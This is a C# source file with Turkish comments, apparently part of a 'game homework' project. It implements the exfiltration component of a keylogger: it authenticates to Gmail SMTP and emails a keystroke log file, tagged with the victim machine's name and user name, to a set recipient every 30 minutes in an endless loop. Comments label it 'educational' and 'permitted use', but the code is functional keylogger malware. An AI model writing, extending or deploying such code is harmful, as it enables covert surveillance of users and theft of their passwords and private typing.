using System;
using System.Net;
using System.Net.Mail;
using System.IO;
using System.Threading.Tasks;

namespace GameOdev
{
    /// <summary>
    /// E-posta ile log gönderimi için yardımcı sınıf
    /// Sadece eğitim amaçlı - izinli kullanım için
    /// </summary>
    public class EmailLogSender
    {
        private string _smtpServer = "smtp.gmail.com";
        private int _smtpPort = 587;
        private string _senderEmail;
        private string _senderPassword;
        private string _recipientEmail;

        public EmailLogSender(string senderEmail, string senderPassword, string recipientEmail)
        {
            _senderEmail = senderEmail;
            _senderPassword = senderPassword;
            _recipientEmail = recipientEmail;
        }

        /// <summary>
        /// Log dosyasını e-posta ile gönder
        /// </summary>
        public async Task SendLogFileAsync(string logFilePath, string computerName = "Unknown")
        {
            try
            {
                using (var client = new SmtpClient(_smtpServer, _smtpPort))
                {
                    client.EnableSsl = true;
                    client.Credentials = new NetworkCredential(_senderEmail, _senderPassword);

                    var mailMessage = new MailMessage
                    {
                        From = new MailAddress(_senderEmail),
                        Subject = $"Educational KeyLogger Log - {computerName} - {DateTime.Now:yyyy-MM-dd HH:mm}",
                        Body = $"Eğitim amaçlı keylogger log dosyası.\n\n" +
                               $"Bilgisayar: {Environment.MachineName}\n" +
                               $"Kullanıcı: {Environment.UserName}\n" +
                               $"Tarih: {DateTime.Now}\n\n" +
                               $"Bu log sadece eğitim amaçlıdır ve izinli kullanımdır."
                    };

                    mailMessage.To.Add(_recipientEmail);

                    if (File.Exists(logFilePath))
                    {
                        var attachment = new Attachment(logFilePath);
                        mailMessage.Attachments.Add(attachment);
                    }

                    await client.SendMailAsync(mailMessage);
                    Console.WriteLine("Log dosyası başarıyla gönderildi.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"E-posta gönderme hatası: {ex.Message}");
            }
        }

        /// <summary>
        /// Belirli aralıklarla otomatik log gönderimi
        /// </summary>
        public async Task StartPeriodicSending(string logFilePath, int intervalMinutes = 30)
        {
            while (true)
            {
                await SendLogFileAsync(logFilePath);
                await Task.Delay(TimeSpan.FromMinutes(intervalMinutes));
            }
        }
    }
}
